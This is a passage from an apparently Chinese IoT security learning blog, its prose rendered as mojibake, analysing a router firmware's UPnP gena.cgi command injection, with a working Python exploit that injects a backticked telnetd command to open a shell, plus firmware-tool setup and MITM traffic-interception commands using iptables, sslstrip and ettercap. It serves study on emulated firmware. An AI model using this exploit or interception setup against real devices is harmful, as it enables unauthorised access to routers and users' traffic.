class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GENA_subscribe_new</span>(<span class="hljs-params"><span class="hljs-variable">$node_base</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$remote</span>, <span class="hljs-variable">$uri</span>, <span class="hljs-variable">$timeout</span>, <span class="hljs-variable">$shell_file</span>, <span class="hljs-variable">$target_php</span>, <span class="hljs-variable">$inf_uid</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-title function_ invoke__">anchor</span>(<span class="hljs-variable">$node_base</span>);<br><span class="hljs-variable">$count</span> = <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;subscription#&quot;</span>);<br><span class="hljs-variable">$found</span> = <span class="hljs-number">0</span>;<br><span class="hljs-comment">/* find subscription index &amp; uuid */</span><br><span class="hljs-keyword">foreach</span> (<span class="hljs-string">&quot;subscription&quot;</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;host&quot;</span>)==<span class="hljs-variable">$host</span> &amp;&amp; <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;uri&quot;</span>)==<span class="hljs-variable">$uri</span>)&#123;<span class="hljs-variable">$found</span> = <span class="hljs-variable">$InDeX</span>; <span class="hljs-keyword">break</span>;&#125;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$found</span> == <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-variable">$index</span> = <span class="hljs-variable">$count</span> + <span class="hljs-number">1</span>;<br><span class="hljs-variable">$new_uuid</span> = <span class="hljs-string">&quot;uuid:&quot;</span>.<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;/runtime/genuuid&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$index</span> = <span class="hljs-variable">$found</span>;<br><span class="hljs-variable">$new_uuid</span> = <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/uuid&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* get timeout */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$timeout</span>==<span class="hljs-number">0</span> || <span class="hljs-variable">$timeout</span>==<span class="hljs-string">&quot;&quot;</span>) &#123;<span class="hljs-variable">$timeout</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$new_timeout</span> = <span class="hljs-number">0</span>;&#125;<br><span class="hljs-keyword">else</span> &#123;<span class="hljs-variable">$new_timeout</span> = <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;/runtime/device/uptime&quot;</span>) + <span class="hljs-variable">$timeout</span>;&#125;<br><span class="hljs-comment">/* set to nodes */</span><br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/remote&quot;</span>,<span class="hljs-variable">$remote</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/uuid&quot;</span>,<span class="hljs-variable">$new_uuid</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/host&quot;</span>,<span class="hljs-variable">$host</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/uri&quot;</span>,<span class="hljs-variable">$uri</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/timeout&quot;</span>,<span class="hljs-variable">$new_timeout</span>);<br><span class="hljs-title function_ invoke__">set</span>(<span class="hljs-string">&quot;subscription:&quot;</span>.<span class="hljs-variable">$index</span>.<span class="hljs-string">&quot;/seq&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br><br><span class="hljs-title function_ invoke__">GENA_subscribe_http_resp</span>(<span class="hljs-variable">$new_uuid</span>, <span class="hljs-variable">$timeout</span>);<br><span class="hljs-title function_ invoke__">GENA_notify_init</span>(<span class="hljs-variable">$shell_file</span>, <span class="hljs-variable">$target_php</span>, <span class="hljs-variable">$inf_uid</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$uri</span>, <span class="hljs-variable">$new_uuid</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æŸ¥çœ‹è°ƒç”¨äº†<code>shell_file</code>çš„å‡½æ•°<code>GENA_notify_init</code>ï¼Œç»§ç»­è·Ÿè¿›</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GENA_notify_init</span>(<span class="hljs-params"><span class="hljs-variable">$shell_file</span>, <span class="hljs-variable">$target_php</span>, <span class="hljs-variable">$inf_uid</span>, <span class="hljs-variable">$host</span>, <span class="hljs-variable">$uri</span>, <span class="hljs-variable">$sid</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-variable">$inf_path</span> = <span class="hljs-title function_ invoke__">XNODE_getpathbytarget</span>(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;inf&quot;</span>, <span class="hljs-string">&quot;uid&quot;</span>, <span class="hljs-variable">$inf_uid</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$inf_path</span>==<span class="hljs-string">&quot;&quot;</span>)<br>&#123;<br><span class="hljs-title function_ invoke__">TRACE_debug</span>(<span class="hljs-string">&quot;can&#x27;t find inf_path by <span class="hljs-subst">$inf_uid</span>=&quot;</span>.<span class="hljs-variable">$inf_uid</span>.<span class="hljs-string">&quot;!&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><span class="hljs-variable">$phyinf</span> = <span class="hljs-title function_ invoke__">PHYINF_getifname</span>(<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$inf_path</span>.<span class="hljs-string">&quot;/phyinf&quot;</span>));<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$phyinf</span> == <span class="hljs-string">&quot;&quot;</span>)<br>&#123;<br><span class="hljs-title function_ invoke__">TRACE_debug</span>(<span class="hljs-string">&quot;can&#x27;t get phyinf by <span class="hljs-subst">$inf_uid</span>=&quot;</span>.<span class="hljs-variable">$inf_uid</span>.<span class="hljs-string">&quot;!&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br><br><span class="hljs-variable">$upnpmsg</span> = <span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">&quot;/runtime/upnpmsg&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$upnpmsg</span> == <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-variable">$upnpmsg</span> = <span class="hljs-string">&quot;/dev/null&quot;</span>;<br><span class="hljs-title function_ invoke__">fwrite</span>(w, <span class="hljs-variable">$shell_file</span>,<br><span class="hljs-string">&quot;#!/bin/sh\n&quot;</span>.<br><span class="hljs-string">&#x27;echo &quot;[$0] ...&quot; &gt; &#x27;</span>.<span class="hljs-variable">$upnpmsg</span>.<span class="hljs-string">&quot;\n&quot;</span>.<br><span class="hljs-string">&quot;xmldbc -P &quot;</span>.<span class="hljs-variable">$target_php</span>.<br><span class="hljs-string">&quot; -V INF_UID=&quot;</span>.<span class="hljs-variable">$inf_uid</span>.<br><span class="hljs-string">&quot; -V HDR_URL=&quot;</span>.<span class="hljs-title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="hljs-variable">$uri</span>).<br><span class="hljs-string">&quot; -V HDR_HOST=&quot;</span>.<span class="hljs-title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="hljs-variable">$host</span>).<br><span class="hljs-string">&quot; -V HDR_SID=&quot;</span>.<span class="hljs-title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="hljs-variable">$sid</span>).<br><span class="hljs-string">&quot; -V HDR_SEQ=0&quot;</span>.<br><span class="hljs-string">&quot; | httpc -i &quot;</span>.<span class="hljs-variable">$phyinf</span>.<span class="hljs-string">&quot; -d &quot;</span>.<span class="hljs-title function_ invoke__">SECURITY_prevent_shell_inject</span>(<span class="hljs-variable">$host</span>).<span class="hljs-string">&quot; -p TCP &gt; &quot;</span>.<span class="hljs-variable">$upnpmsg</span>.<span class="hljs-string">&quot;\n&quot;</span><br>);<br><span class="hljs-title function_ invoke__">fwrite</span>(a, <span class="hljs-variable">$shell_file</span>, <span class="hljs-string">&quot;rm -f &quot;</span>.<span class="hljs-variable">$shell_file</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨å‡½æ•°<code>GENA_notify_init</code>ä¸­ï¼Œä¼šä¸¤æ¬¡è°ƒç”¨<code>fwrite</code>å†™å…¥ä¸€ä¸ªshellè„šæœ¬ã€‚ç”±ä¹‹å‰çš„æŠ¥æ–‡å¯çŸ¥<code>$shell_file</code>æ˜¯é€šè¿‡<code>.sh</code>å½¢å¼ä¼ å…¥ã€‚ç¬¬ä¸€æ¬¡è°ƒç”¨<code>fwrite</code>ï¼Œåˆ›å»º.shæ–‡ä»¶ï¼›è€Œåœ¨ç¬¬äºŒæ¬¡è°ƒç”¨ä¸­ï¼Œåˆ©ç”¨<code>fwrite</code>å‘.shæ–‡ä»¶ä¸­å†™å…¥<code>&quot;rm -f &quot;.$shell_file.&quot;\n&quot;</code>çš„åˆ é™¤å‘½ä»¤ã€‚</p><blockquote><p>è¿™é‡Œéœ€è¦è®²åˆ°ä¸€ä¸ªæœºåˆ¶ï¼Œshellå‘½ä»¤ä¸­ä¼šå°†&#96;&#96;åŒ…è£¹çš„å†…å®¹ä½œä¸ºå˜é‡ï¼Œå³ä¼šå…ˆæ‰§è¡Œå…¶ä¸­ä¸­çš„å†…å®¹ </p></blockquote><p><img src="/img/article/iot-3/image-20220916165317731.png" alt="image-20220916165317731"></p><p>é‚£ä¹ˆåªéœ€è¦æ’å…¥ä¸€ä¸ªåå¼•å·åŒ…è£¹çš„ç³»ç»Ÿå‘½ä»¤ï¼Œå°†å…¶æ³¨å…¥åˆ°<strong>shell</strong>è„šæœ¬ä¸­ï¼Œå½“è„šæœ¬æ‰§è¡Œ<code>rm</code>å‘½ä»¤æ—¶é‡åˆ°åå¼•å·å°†å¤±è´¥ï¼Œç»§ç»­æ‰§è¡Œå¼•å·é‡Œé¢çš„ç³»ç»Ÿå‘½ä»¤ï¼Œä»è€Œè¾¾åˆ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´çš„è§¦å‘ã€‚å› æ­¤ï¼Œæ§åˆ¶å¥½<code>&quot;/gena.cgi?service=shell_file&quot;</code>ä¸­<strong>shell_file</strong>çš„å†…å®¹ä¸ºåå¼•å·åŒ…è£¹çš„ç³»ç»Ÿå‘½ä»¤ï¼Œå°±å¯ä»¥è§¦å‘æ¼æ´ã€‚</p><h2 id="ç¯å¢ƒæ¨¡æ‹Ÿ"><a href="#ç¯å¢ƒæ¨¡æ‹Ÿ" class="headerlink" title="ç¯å¢ƒæ¨¡æ‹Ÿ"></a>ç¯å¢ƒæ¨¡æ‹Ÿ</h2><blockquote><p>ç¯å¢ƒæ­å»ºæ–¹æ³•å¯è§ä¸Šä¸€ç¯‡æ–‡ç« <a href="https://loora1n.github.io/2022/09/15/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%BA%8C%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">ã€IOT å­¦ä¹ äºŒã€‘å›ºä»¶åˆ†æä¸æ¼æ´åˆ©ç”¨ - é·ºé›¨ã®Blog (loora1n.github.io)</a></p></blockquote><p>é¦–å…ˆåˆ©ç”¨<strong>fat</strong>å®Œæˆå›ºä»¶ä»¿çœŸ</p><p><img src="/img/article/iot-3/image-20220916163243521.png" alt="image-20220916163243521"></p><p>é€šè¿‡<code>nmap</code>å‘½ä»¤æˆ‘ä»¬å¯ä»¥ç¡®å®šï¼Œå›ºä»¶ç¯å¢ƒæ˜¯å¦ä»¿çœŸæˆåŠŸã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå‡ ä¸ªç«¯å£å·²ç»æ‰“å¼€</p><p><img src="/img/article/iot-3/image-20220916163335524.png" alt="image-20220916163335524"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-comment"># Exploit By Miguel Mendez &amp; Pablo Pollanco</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">httpSUB</span>(<span class="hljs-params">server, port, shell_file</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\n[*] Connection &#123;host&#125;:&#123;port&#125;&#x27;</span>).<span class="hljs-built_in">format</span>(host=server, port=port)<br>    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    request = <span class="hljs-string">&quot;SUBSCRIBE /gena.cgi?service=&quot;</span> + <span class="hljs-built_in">str</span>(shell_file) + <span class="hljs-string">&quot; HTTP/1.0\n&quot;</span><br>    request += <span class="hljs-string">&quot;Host: &quot;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-built_in">str</span>(port) + <span class="hljs-string">&quot;\n&quot;</span><br>    request += <span class="hljs-string">&quot;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;\n&quot;</span><br>    request += <span class="hljs-string">&quot;NT: upnp:event\n&quot;</span><br>    request += <span class="hljs-string">&quot;Timeout: Second-1800\n&quot;</span><br>    request += <span class="hljs-string">&quot;Accept-Encoding: gzip, deflate\n&quot;</span><br>    request += <span class="hljs-string">&quot;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n&quot;</span><br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Sending Payload&#x27;</span>)<br>    con.connect((socket.gethostbyname(server),port))<br>    con.send(request.encode())<br>    results = con.recv(<span class="hljs-number">4096</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Running Telnetd Service&#x27;</span>)<br>    sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[*] Opening Telnet Connection\n&#x27;</span>)<br>    sleep(<span class="hljs-number">2</span>)<br>    os.system(<span class="hljs-string">&#x27;telnet &#x27;</span> + <span class="hljs-built_in">str</span>(server) + <span class="hljs-string">&#x27; 9999&#x27;</span>)<br>serverInput = raw_input(<span class="hljs-string">&#x27;IP Router: &#x27;</span>)<br>portInput = <span class="hljs-number">49152</span><br>httpSUB(serverInput, portInput, <span class="hljs-string">&#x27;`telnetd -p 9999 &amp;`&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="EXPè®²è§£"><a href="#EXPè®²è§£" class="headerlink" title="EXPè®²è§£"></a>EXPè®²è§£</h3><p>æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œå…¶å›ºä»¶å¯åŠ¨äº†telnetæœåŠ¡ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå¼•å· ,å°†<code>telnet -p 9999 &amp;</code> åŒ…è£¹ï¼Œå¹¶ä¼ å…¥å˜é‡$shell_fileè®©å…¶å¼€æ”¾9999ç«¯å£ï¼Œéšåæœ¬æœºè¿æ¥å³å¯ã€‚</p><p>è¿è¡Œè„šæœ¬åï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ‹¿åˆ°<code>shell</code>,åŒæ—¶ç”¨<code>nmap</code>æ‰«æipå¯ä»¥çœ‹åˆ°9999ç«¯å£ç¡®å®å·²ç»å¼€æ”¾äº†ã€‚</p><p><img src="/img/article/iot-3/image-20220916170501767.png" alt="image-20220916170501767"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IOT å­¦ä¹ äºŒã€‘å›ºä»¶åˆ†æä¸æ¼æ´åˆ©ç”¨</title>
    <link href="/2022/09/15/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%BA%8C%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2022/09/15/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%BA%8C%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡å†…å®¹æ˜¯åŸºäºã€Šç‰©è”ç½‘æ¸—é€æµ‹è¯•ã€‹-ç¾Â·äºšä¼¦å¤å…¹æ›¼çš„å­¦ä¹ æ€»ç»“</p></blockquote><h2 id="åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ"><a href="#åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ" class="headerlink" title="åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ"></a>åŸºäºå›ºä»¶ä»¿çœŸçš„åŠ¨æ€åˆ†æ</h2><h3 id="å‰æœŸå‡†å¤‡"><a href="#å‰æœŸå‡†å¤‡" class="headerlink" title="å‰æœŸå‡†å¤‡"></a>å‰æœŸå‡†å¤‡</h3><blockquote><p>ä¹¦æ¥ä¸Šä¸€ç¯‡æ–‡ç« çš„å®‰è£…é”™è¯¯ï¼Œåœ¨æˆ‘å‡ ä¹è¿ç»­ä¸æ–­çš„å°è¯•äº†10ä½™ä¸ªå°æ—¶åï¼Œç¯å¢ƒç»ˆäºæ­å»ºå®Œæ¯•ï¼Œè¿™é‡Œé‡‡ç”¨Ubuntu20.04ï¼ŒKaliæœ‰å„ç§å„æ ·å¥‡è‘©é—®é¢˜æ˜¯çœŸæœ‰ç‚¹éº»çƒ¦ã€‚</p><p>æœ¬ç¯‡æ–‡ç« å†™äº2020&#x2F;9&#x2F;15ï¼Œç”±äºæ—¶é—´æœ‰æ•ˆæ€§çš„å­˜åœ¨ï¼Œæœ¬ç¯‡æ–‡ç« ä»…ä¾›å‚è€ƒ</p></blockquote><p><img src="/img/article/iot-2/image-20220915191611191-1663245953755-2.png" alt="è¿è¡ŒæˆåŠŸæˆªå›¾"></p><h4 id="é¡¹ç›®ä¸‹è½½"><a href="#é¡¹ç›®ä¸‹è½½" class="headerlink" title="é¡¹ç›®ä¸‹è½½"></a>é¡¹ç›®ä¸‹è½½</h4><p>é¦–å…ˆä¸‹è½½ä¸‹æ¥é¡¹ç›®FAT</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/attify/firmware-analysis-toolkit<br><span class="hljs-built_in">cd</span> firmware-analysis-toolkit<br></code></pre></td></tr></table></figure><p><strong>è¿™é‡Œæ³¨æ„æ³¨æ„ï¼šå…ˆæ‰“å¼€ç¼–è¾‘setup.shï¼Œä¸æ˜¯è¿è¡Œä¸æ˜¯è¿è¡Œï¼ï¼ï¼</strong></p><p>å…ˆæ³¨é‡Šæ‰å®‰è£…binwalkçš„éƒ¨åˆ†ï¼Œæˆ‘ä»¬é‡‡ç”¨æ‰‹åŠ¨ç¼–è¯‘çš„æ–¹å¼</p><p><img src="/img/article/iot-2/image-20220915191827246.png" alt="image-20220915191827246"></p><h4 id="æ‰‹åŠ¨ç¼–è¯‘binwalk"><a href="#æ‰‹åŠ¨ç¼–è¯‘binwalk" class="headerlink" title="æ‰‹åŠ¨ç¼–è¯‘binwalk"></a>æ‰‹åŠ¨ç¼–è¯‘binwalk</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> --depth=1 https://github.com/ReFirmLabs/binwalk.git<br><span class="hljs-built_in">cd</span> binwalk<br>sed -i <span class="hljs-string">&#x27;/REQUIRED_UTILS=&quot;wget tar python&quot;/c\REQUIRED_UTILS=&quot;wget tar python3&quot;&#x27;</span> deps.sh<br></code></pre></td></tr></table></figure><p>è¿™æ—¶å€™è¦æ³¨æ„ä¸€ä¸ªç‚¹ï¼Œå…¶ä¸­çš„ä¸€éƒ¨åˆ†é“¾æ¥404æ‰¾ä¸åˆ°äº†ã€‚æˆ‘çªç„¶å‘ç°<strong>binwalk</strong>å¤šäº†ä¸€ä¸ª4å°æ—¶å‰çš„<strong>issue</strong>æ›´æ–°äº†é“¾æ¥ï¼Œæ˜¯çœŸæœäº†ã€‚<a href="https://github.com/ReFirmLabs/binwalk/pull/613">fix stuffit archiveâ€™s download url by dev2ero Â· Pull Request #613 Â· ReFirmLabs&#x2F;binwalk (github.com)</a></p><p><img src="/img/article/iot-2/image-20220915154244272.png" alt="image-20220915154244272"></p><p>éœ€è¦å‚ç…§è¿™ä¸ªissueç¡®å®šè‡ªå·±çš„ä¸‹è½½åœ°å€æ²¡æœ‰é—®é¢˜åï¼Œè¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo ./deps.sh --<span class="hljs-built_in">yes</span><br>sudo python3 ./setup.py install<br>sudo apt-get install libmagic1<br></code></pre></td></tr></table></figure><blockquote><p> å¦‚æœåœ¨è¿è¡Œ.&#x2F;deps.shä¸­å‡ºç°é—®é¢˜ï¼Œå¯åŒæ ·æ ¹æ®å…¶è„šæœ¬æ‰‹åŠ¨è¾“å…¥å‘½åå®‰è£…ç›¸å…³ä¾èµ–</p></blockquote><h4 id="å®‰è£…jefferson"><a href="#å®‰è£…jefferson" class="headerlink" title="å®‰è£…jefferson"></a>å®‰è£…jefferson</h4><blockquote><p> <a href="https://github.com/sviehb/jefferson">sviehb&#x2F;jefferson: JFFS2 filesystem extraction tool (github.com)</a></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/sviehb/jefferson.git<br><span class="hljs-built_in">cd</span> jefferson<br>sudo apt update<br>sudo apt install python3-pip liblzo2-dev<br>sudo python3 -m pip install -r requirements.txt<br>sudo python3 setup.py install<br></code></pre></td></tr></table></figure><p>å›åˆ°FATç›®å½•ä¸‹ï¼Œè¿è¡Œ<code>setup.sh</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./setup.sh<br></code></pre></td></tr></table></figure><p>å®‰è£…æˆåŠŸåï¼Œæ›´æ”¹<code>fat.config</code>æ–‡ä»¶å†…çš„<code>root</code>å¯†ç ä¸ºå½“å‰ç³»ç»Ÿçš„<code>root</code>è´¦æˆ·å¯†ç </p><p><img src="/img/article/iot-2/image-20220915193111383.png" alt="image-20220915193111383"></p><p>ç„¶åæ­£å¸¸è¿è¡Œå³å¯ï¼Œæˆ‘å­˜æ”¾äº†ä¸€äº›å›ºä»¶åœ¨GitHubä¸Šå¯ä»¥ç”¨äºç»ƒä¹ ï¼š<a href="https://github.com/Loora1N/IOT-Frameware">Loora1N&#x2F;IOT-Frameware (github.com)</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./fat.py &lt;firmware file&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IOT å­¦ä¹ ä¸€ã€‘å›ºä»¶åˆ†æä¸æ¼æ´åˆ©ç”¨</title>
    <link href="/2022/09/14/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%B8%80%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2022/09/14/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%B8%80%E3%80%91%E5%9B%BA%E4%BB%B6%E5%88%86%E6%9E%90%E4%B8%8E%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<blockquote><p>æœ¬æ–‡å†…å®¹æ˜¯åŸºäºã€Šç‰©è”ç½‘æ¸—é€æµ‹è¯•ã€‹-ç¾Â·äºšä¼¦å¤å…¹æ›¼çš„å­¦ä¹ æ€»ç»“</p></blockquote><h2 id="å›ºä»¶æå–"><a href="#å›ºä»¶æå–" class="headerlink" title="å›ºä»¶æå–"></a>å›ºä»¶æå–</h2><ul><li><p>åœ¨ç¡¬ä»¶å‚å•†ç½‘ç«™å†…ç›´æ¥ä¸‹è½½</p></li><li><p>å›ºä»¶æ›´æ–°æ—¶ï¼Œåˆ©ç”¨ä¸­é—´äººæ”»å‡»ï¼Œè½¬å‘ä»£ç†æµé‡</p></li><li><p>é€šè¿‡ç‰©ç†è¿æ¥ï¼Œç›´æ¥ä»è®¾å¤‡è½¬å‚¨å›ºä»¶ã€‚å›ºä»¶å­˜å‚¨ä¸ºbinæ–‡ä»¶æŒ‡ä»¤:</p><p> <code>$ flashrom -p ft2232_spi:type=232H -r spidump.bin</code></p></li><li><p>åˆ©ç”¨æœç´¢å¼•æ“æœé›†å›ºä»¶ï¼Œè¿˜å¯ä»¥åˆ©ç”¨ <a href="https://www.exploit-db.com/google-hacking-database">Google Hackingæ•°æ®åº“</a>æœç´¢å›ºä»¶æˆ–è®¾å¤‡</p></li></ul><p><img src="/img/article/iot-1/image-20220914135931400.png" alt="image-20220914135931400"></p><h3 id="MITMè½¬å‘ä»£ç†æµé‡æµç¨‹"><a href="#MITMè½¬å‘ä»£ç†æµé‡æµç¨‹" class="headerlink" title="MITMè½¬å‘ä»£ç†æµé‡æµç¨‹"></a>MITMè½¬å‘ä»£ç†æµé‡æµç¨‹</h3><blockquote><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ç®€è¦ä»‹ç»äº†å¦‚ä½•ä½¿ç”¨Kali Linuxã€SSLstripã€ Ettercapå’ŒWiresharkæ­å»ºMITMæµ‹è¯•ç¯å¢ƒï¼Œä»¥åœ¨è®¾å¤‡æ›´æ–°æœŸé—´æ•è·è®¾å¤‡ æµé‡</p></blockquote><ol><li><p>å¯ç”¨IPè½¬å‘åŠŸèƒ½<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code></p></li><li><p>é…ç½®iptablesï¼Œå°†ç›®çš„ç«¯å£80çš„æµé‡é‡å®šå‘è‡³SSLstripç›‘å¬çš„ç«¯å£10000ã€‚<code>iptables -t nat -p tcp -A PREROUTING --dport 80 -j REDIRECT --to-port 10000</code></p></li><li><p>å¯åŠ¨SSLstrips: <code>sslstrip -a</code></p></li><li><p>å¯åŠ¨Ettercap GUIï¼š<code>ettercap -G</code></p></li></ol><p><img src="/img/article/iot-1/image-20220914134344716.png" alt="image-20220914134344716"></p><ol start="5"><li>åœ¨<code>primary 